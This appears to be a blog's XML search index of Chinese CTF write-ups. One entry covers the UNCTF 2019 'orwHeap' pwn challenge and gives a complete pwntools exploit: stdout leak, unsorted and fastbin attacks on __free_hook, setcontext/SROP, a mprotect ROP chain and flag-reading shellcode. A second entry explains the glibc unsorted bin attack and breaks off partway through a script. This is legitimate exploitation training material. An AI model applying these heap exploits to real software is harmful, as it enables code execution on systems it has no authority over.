<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UNCTF_2019_pwn_orwHeap</title>
      <link href="/2020/02/01/unctf-2019-pwn-orwheap/"/>
      <url>/2020/02/01/unctf-2019-pwn-orwheap/</url>
      
        <content type="html"><![CDATA[<h3 id="orwpwn"><a href="#orwpwn" class="headerlink" title="orwpwn"></a>orwpwn</h3><blockquote><p><a href="https://xz.aliyun.com/t/6731#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6731#toc-8</a><br><a href="http://blog.eonew.cn/archives/993" target="_blank" rel="noopener">http://blog.eonew.cn/archives/993</a> setcontext 函数exploit<br><a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">https://xz.aliyun.com/t/6645</a> shellcode的编写 </p></blockquote><p>这个一个保护全开的堆的题目：</p><pre><code>[*] &#39;/home/root0/pratice/2020_heap_practice/unctf/pwn&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><img src="/2020/02/01/unctf-2019-pwn-orwheap/image-20200128150915887.png" title="This is an image"><p>同时又这里我们可以知道，这个程序禁止了一部分的系统调用，我们可以用seccomp-tools这个工具来查看一下：</p><pre><code> line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><p>同时，又这个题目的add函数可以看出这个题目的数据结构相当简单，两个bss段的数组分别存放mem指针和用户输入的size大小，然后后面的edit , delete之类的功能都依赖于这两个数据结构。<br><strong>漏洞点</strong><br>add函数中的read_input函数：<br><img src="/2020/02/01/unctf-2019-pwn-orwheap/image-20200128151344744.png" title="This is an image"></p><p>read_input:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">read_input</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-34h]</span>  __int64 buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-30h]</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-28h]</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-20h]</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-8h]</span>  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>buf <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v8<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看出这里可以溢出两个字节的数据,同时这个程序没有可以输出堆块的程序分支。</p><p>利用过程：</p><ol><li><p>劫持stdout来获得libc的基地址</p><ol><li>IO_file攻击：我们现在堆块中分配出main_arena,然后通过覆盖两个字节使得其有1/16的可能性使得main_arena被改成stdout，然后我们更改stdout这个IO_file_plus结构体，如此我们可以输出_IO_write_ptr和_IO_write_base之间的数据，实现泄露。</li></ol></li><li><p>unsortedbin攻击，我们利用此可以把free_hook的附近写入main_arena，然后可以错位构造chunk，使得我们在free_hook之间有了可用的chunk_size。</p></li><li><p>fastbin attack来实现__free_hook的写入。</p></li><li><p>我们把<code>setcontext+53</code>写入__free_hook来扩大控制范围。</p></li><li><p>利用SROP调用read函数，把rop chain和shellcode写入到目标区域。</p></li><li><p>rop chain来实现mprotect修改内存页权限。</p></li><li><p>调用shellcode</p></li></ol><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcherexec_binary <span class="token operator">=</span> <span class="token string">"./pwn"</span>libcversion <span class="token operator">=</span> <span class="token string">'2.23'</span>local <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binarycontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>                                                         libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>                                                         libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span> libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd <span class="token operator">+</span> r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base<span class="token punctuation">,</span> libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span> <span class="token operator">+</span> \        str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">"set $libc_base="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    break_point <span class="token operator">+=</span> <span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span> break_point<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">" ==> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">,</span>flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>ptr_array <span class="token operator">=</span> <span class="token number">0x000000000202060</span>size_array <span class="token operator">=</span> <span class="token number">0x0000000002020A0</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>malloc<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">"aa"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">0x70</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x2620</span><span class="token operator">-</span><span class="token number">0x43</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x33</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#4</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x70</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x70</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x70</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x70</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libcbase<span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">)</span>frame_read <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame_read<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>frame_read<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token punctuation">(</span>libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>frame_read<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x2000</span>frame_read<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token punctuation">(</span>libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>frame_read<span class="token punctuation">.</span>rip <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0xbc375</span>payload <span class="token operator">=</span> str<span class="token punctuation">(</span>frame_read<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>payload<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0x98</span><span class="token punctuation">]</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>layout <span class="token operator">=</span> <span class="token punctuation">[</span>    libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000021102</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret; </span>    libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">,</span>    libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x00000000000202e8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret; </span>    <span class="token number">0x2000</span><span class="token punctuation">,</span>    libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000001b92</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret; </span>    <span class="token number">7</span><span class="token punctuation">,</span>    libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000033544</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>    <span class="token number">10</span><span class="token punctuation">,</span>    libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x00000000000bc375</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>    libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000002a71</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: jmp rsp;     </span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''push 0x67616c66mov rdi, rspxor esi, esimov eax, 2syscallmov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscallmov edx, eaxmov rsi, rspmov edi, 1mov eax, edisyscall'''</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>flat<span class="token punctuation">(</span>layout<span class="token punctuation">)</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>​     </p>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap unsorted bin attack</title>
      <link href="/2020/01/30/glibc-heap-unsorted-bin-attack/"/>
      <url>/2020/01/30/glibc-heap-unsorted-bin-attack/</url>
      
        <content type="html"><![CDATA[<p>unsorted bin 基本简介：<br>    1.它是一种双向链表的形式， 采用FILO的遍历形式。<br>    2.我们知道malloc的时候最先寻找fastbin, 但是当fastbin里面没有合适的chunk的时候，它会去寻找small bin 如果还是没有的话，就会尝试从unsorted bin里面去寻找chunk。</p><p>相关源码解释：</p><pre class=" language-C"><code class="language-C">  /* remove from unsorted list */          if (__glibc_unlikely (bck->fd != victim))            malloc_printerr ("malloc(): corrupted unsorted chunks 3");          unsorted_chunks (av)->bk = bck;          bck->fd = unsorted_chunks (av); </code></pre><p>通过上面的bck-&gt;fd = unsorted_chunks (av);我们可以知道， 如果把一个unsorted bin被取出来的话 ， 会将bck-&gt;fd 的位置的内容写入到本unsorted bin的位置 ，那么我们就需要控制bk的值 ， 来实现任意地址写，其实原理有点类似于unlink操作，但是由于最后的目标地址会被写成main_arean里面的内容，所以任意写的值我们无法控制。<br>这其实就是把一个unsorted chunk从链表里拿出来的时候，把fd部分写成了链表里面的unsorted bin 的值。</p><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li></ul><p>这样的话就可以实现上述功能。</p><p>ctf-wiki里面有一个题目，说明了unsorted bin attack的功能之一，题目很简单，首先是一个堆溢出，然后我们就可以修改unsorted bin attack的bk，然后把magic处修改为一个很大的值，实现利用。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcherexec_binary <span class="token operator">=</span> <span class="token string">"./magicheap"</span>libcversion <span class="token operator">=</span> <span class="token string">'2.23'</span>local <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binarycontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token 